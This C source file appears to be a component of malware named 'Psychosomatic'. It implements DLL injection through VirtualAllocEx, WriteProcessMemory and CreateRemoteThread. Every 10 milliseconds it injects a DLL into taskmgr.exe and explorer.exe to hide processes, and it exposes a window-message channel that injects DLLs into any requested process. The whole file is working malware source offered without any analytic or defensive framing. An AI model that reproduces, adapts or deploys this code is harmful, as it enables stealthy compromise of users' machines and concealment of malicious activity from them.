#include "hide_payload.h"

CHAR dllPathAnsi[MAX_PATH] = { 0 };
static PCOMMUNICATION_DATA pLastRecievedData = NULL;

BOOL IsProcessInfected(HANDLE hProc, char* dllName) {
	HMODULE modules[1024];
	DWORD needed = 0;
	CHAR moduleName[MAX_PATH];
	if (K32EnumProcessModules(hProc, modules, sizeof(modules), &needed)) {
		for (INT i = 0; i < (needed / sizeof(HMODULE)); i++) {
			if (K32GetModuleFileNameExA(hProc, modules[i], moduleName, sizeof(moduleName))) {

				// Prevent duplicate DLL injection
				if (!lstrcmpiA(moduleName, dllName)) {
					return TRUE;
				}
			}
		}
	}
	return FALSE;
}

int PichInjectDLL(HANDLE hProc, char* dllName, BOOL bWaitForThread) {
	if (IsProcessInfected(hProc, dllName)) {
		printf("[INFO] [Warning] Duplicate injection prevented!\n");
		return 0;
	}

	SIZE_T dwBytesWritten = 0;
	HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
	if (!kernel32) {
		return 2;
	}
	FARPROC LoadLibraryAPtr = GetProcAddress(kernel32, "LoadLibraryA");
	if (!LoadLibraryAPtr) {
		return 3;
	}

	if (!hProc) {
		return 4;
	}

	LPVOID lpRemoteMem = VirtualAllocEx(hProc, NULL, strlen(dllName) + 1,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteMem) {
		printf("[PICH] [Error] Failed to allocate virtual memory!\n");
		CloseHandle(hProc);
		return 5;
	}

	if (!WriteProcessMemory(hProc, lpRemoteMem, dllName,
		strlen(dllName) + 1, &dwBytesWritten)) {
		printf("[PICH] [Error] Failed to write remote process memory!\n");
		VirtualFreeEx(hProc, lpRemoteMem, 0, MEM_RELEASE);
		CloseHandle(hProc);
		return 6;
	}

	HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryAPtr,
		lpRemoteMem, 0, NULL);
	if (!hRemoteThread) {
		printf("[PICH] [Error] CreateRemoteThread failed!\n");
		VirtualFreeEx(hProc, lpRemoteMem, 0, MEM_RELEASE);
		CloseHandle(hProc);
		return 7;
	}

	printf("[PICH] [SUCCESS] Remote thread started!\n");
	if (bWaitForThread)
		WaitForSingleObject(hRemoteThread, -1);
	CloseHandle(hRemoteThread);
	VirtualFreeEx(hProc, lpRemoteMem, 0, MEM_RELEASE);
	CloseHandle(hProc);
	return 0;
}

LRESULT CALLBACK PichWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	PCOPYDATASTRUCT pCds;
	INT nErr = 0;
	switch (uMsg) {
		case WM_CREATE: {
			printf("[PICH] [Info] Psychosomatic Interprocess Communication Handler (PICH) launched successfully!\n");
			break;
		}
		case WM_COPYDATA: {
			pCds = (PCOPYDATASTRUCT)lParam;
			pLastRecievedData = (PCOMMUNICATION_DATA)pCds->lpData;
			printf("[PICH] [Info] Data recieved, bytes -> %lu\n", pCds->cbData);
		}
		case PSYCHOSOMATIC_COMMUNICATE: {
			printf("[PICH] [Info] Communication request\n");
			if (!pLastRecievedData) {
				nErr = 9;
				printf("[PICH] [Error] No last data\n");
				break;
			}
			switch (pLastRecievedData->msg) {
			case PSCOM_INJECT_DLL: {
				printf("[PICH] PSCOM_INJECT_DLL message recieved\n");
				//CHAR data[256];
				//sprintf_s(data, 256, "DLL: %s\nPID: %lu", pLastRecievedData->dllPath, pLastRecievedData->pid);
				//MessageBoxA(NULL, data, "Info", MB_ICONASTERISK);
				//printf("%s\n", data);
				HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pLastRecievedData->pid);
				if (!hProc) {
					nErr = 8;
					printf("[PICH] [Error] Invalid access\n");
					break;
				}
				nErr = PichInjectDLL(hProc, pLastRecievedData->dllPath, TRUE);
				CloseHandle(hProc);
				printf("[PICH] [STATUS] Status: %d\n", nErr);
				break;
			}
			}
		}
		default:
			return DefWindowProc(hWnd, uMsg, wParam, lParam);
	}
	return nErr;
}

DWORD CALLBACK PichCreateWindowThread(LPVOID lpParameter) {
	WNDCLASS wndclass;
	HINSTANCE hInstance = GetModuleHandle(NULL);

	ZeroMemory(&wndclass, sizeof(WNDCLASS));

	wndclass.lpfnWndProc = PichWndProc;
	wndclass.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wndclass.hInstance = hInstance;
	wndclass.lpszClassName = TEXT("Psychosomatic Interprocess Communication Handler");
	wndclass.hCursor = LoadCursor(NULL, IDI_HAND);
	wndclass.style = CS_VREDRAW | CS_HREDRAW;

	if (!RegisterClass(&wndclass)) {
		printf("Failed to register class!\n");
		return 1;
	}

	HWND hWnd = CreateWindowEx(0, wndclass.lpszClassName, wndclass.lpszClassName, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL,
		hInstance, NULL);

	if (!hWnd) {
		printf("Failed to create window! GetLastError : %lu\n", GetLastError());
		UnregisterClass(wndclass.lpszClassName, hInstance);
		return 2;
	}

	if (!ChangeWindowMessageFilterEx(hWnd, WM_COPYDATA, MSGFLT_ALLOW, NULL)) {
		printf("ChangeWindowMessageFilterEx 1 failed, GetLastError : %lu\n", GetLastError());
		UnregisterClass(wndclass.lpszClassName, hInstance);
		return 3;
	}

	if (!ChangeWindowMessageFilterEx(hWnd, PSYCHOSOMATIC_COMMUNICATE, MSGFLT_ALLOW, NULL)) {
		printf("ChangeWindowMessageFilterEx 2 failed, GetLastError : %lu\n", GetLastError());
		UnregisterClass(wndclass.lpszClassName, hInstance);
		return 4;
	}

	MSG msg;
	while (GetMessage(&msg, hWnd, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnregisterClass(wndclass.lpszClassName, hInstance);
	return 0;
}

DWORD CALLBACK PsFirstInfectionRoutineSeries(LPVOID lpUnusedParameter) {
	DWORD pid = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	if (Process32First(snapshot, &process))
	{
		do {
			if ((!lstrcmpiW(process.szExeFile, L"taskmgr.exe")) || 
				(!lstrcmpiW(process.szExeFile, L"explorer.exe"))) {
				pid = process.th32ProcessID;
				HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
				if (hProc) {
					if (!IsProcessInfected(hProc, dllPathAnsi))
						PichInjectDLL(hProc, dllPathAnsi, TRUE);
					CloseHandle(hProc);
				}
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	return 0;
}

DWORD CALLBACK PsHideFromProcessesCommunicatorThread(LPVOID lpParameter) {
	HANDLE hThread = PsLaunchThread(PichCreateWindowThread, NULL);
	if (hThread)
		CloseHandle(hThread);
	while (1) {
		PsFirstInfectionRoutineSeries(NULL);
		Sleep(10);
	}
	return 1;
}

VOID WINAPI PsHideFromProcessesPayload(void) {
	if (!ExtracedDLL)
		return;
	
	ZeroMemory(dllPathAnsi, MAX_PATH);
	WideCharToMultiByte(CP_ACP, 0, PsychosomaticDLLPath, -1,
						dllPathAnsi, MAX_PATH, NULL, NULL);
	//MessageBoxA(NULL, dllPathAnsi, "Info", MB_ICONASTERISK);

	HANDLE hThread = PsLaunchThread(PsHideFromProcessesCommunicatorThread, NULL);
	if (hThread)
		CloseHandle(hThread);
}
